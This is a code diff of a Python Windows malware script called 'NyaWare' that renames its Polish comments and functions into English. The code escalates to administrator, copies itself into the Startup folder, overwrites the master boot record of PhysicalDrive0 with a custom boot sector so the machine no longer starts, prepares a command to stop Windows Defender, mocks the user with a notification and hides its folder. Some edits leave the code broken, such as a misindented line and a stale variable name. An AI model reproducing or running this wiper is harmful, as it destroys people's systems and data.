@@ -11,30 +11,31 @@ from win32file import *
 from plyer import notification
 import shutil
 
+# Run as administrator
+
 if not ctypes.windll.shell32.IsUserAnAdmin():
     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, ' '.join(sys.argv), None, 1)
     sys.exit()
 
  
-# Pobranie ścieżki do folderu, w którym znajduje się skrypt
+# Add program to autostart
 script_dir = os.path.dirname(os.path.abspath(__file__))
- 
-# Ścieżka do folderu NyaWare względem skryptu
+
 source_folder = os.path.join(script_dir, 'NyaWare')
  
-# Ścieżka do folderu autostartu
-username = os.getlogin()  # Pobranie aktualnej nazwy użytkownika
+
+username = os.getlogin()  
 startup_folder = os.path.join(
     os.environ['APPDATA'],
     r'Microsoft\Windows\Start Menu\Programs\Startup'
 )
  
 def copy_folder_to_startup(source, destination):
-    # Jeśli folder docelowy nie istnieje, utwórz go
+    
     if not os.path.exists(destination):
         os.makedirs(destination)
  
-    # Kopiowanie plików i folderów
+    
     for item in os.listdir(source):
         s = os.path.join(source, item)
         d = os.path.join(destination, item)
@@ -42,20 +43,24 @@ def copy_folder_to_startup(source, destination):
             shutil.copytree(s, d, dirs_exist_ok=True)
         else:
             shutil.copy2(s, d)
- 
-# Kopiowanie zawartości folderu NyaWare do folderu autostartu
+ 
 copy_folder_to_startup(source_folder, startup_folder)
 
-    
-def rozpierdolMBR():
+# Overwrite MBR
+
+def fuckMBR():
     NyaOS = b'1\xc0\x8e\xd8\x8e\xc0\xbb\x00\x80\xbe\x1f|\xe8\x00\x00VP\xac\x08\xc0t\x06\xb4\x0e\xcd\x10\xeb\xf5X^\xc3Your computer was succesfully repaired (Windows has been deleted)\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00U\xaa'
     hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
     WriteFile(hDevice, NyaOS, None)
     CloseHandle(hDevice)
 
-rozpierdolMBR()
+fuckMBR()
+
+# Stop windows defender
 
 command = "sc stop WinDefend"
+
+# Send notification
 
 notification.notify(
     title='You are an idiot',
@@ -64,25 +69,27 @@ notification.notify(
     timeout=10
     )
 
-def ukryj_folder(sciezka):
+# Hide folder
+
+def hide(path):
     try:
+  path = os.path.abspath(path)
         
-        sciezka = os.path.abspath(sciezka)
         
+        ctypes.windll.kernel32.SetFileAttributesW(path, 0x02)
         
-        ctypes.windll.kernel32.SetFileAttributesW(sciezka, 0x02)
-        
-        print(f'Ukryto folder "{sciezka}"')
+        print(f'Hide: "{sciezka}"')
     except Exception as e:
-        print(f'Bład podczas ukrywania folderu: {e}')
+        print(f'Error: {e}')
 
 if __name__ == "__main__":
     
-    sciezka_skryptu = os.path.dirname(os.path.realpath(__file__))
+    script_path = os.path.dirname(os.path.realpath(__file__))
     
     
-    ukryj_folder(sciezka_skryptu)
+    hide(script_path)
 
+# Goofy ahh music and images
 
 pygame.init()
 
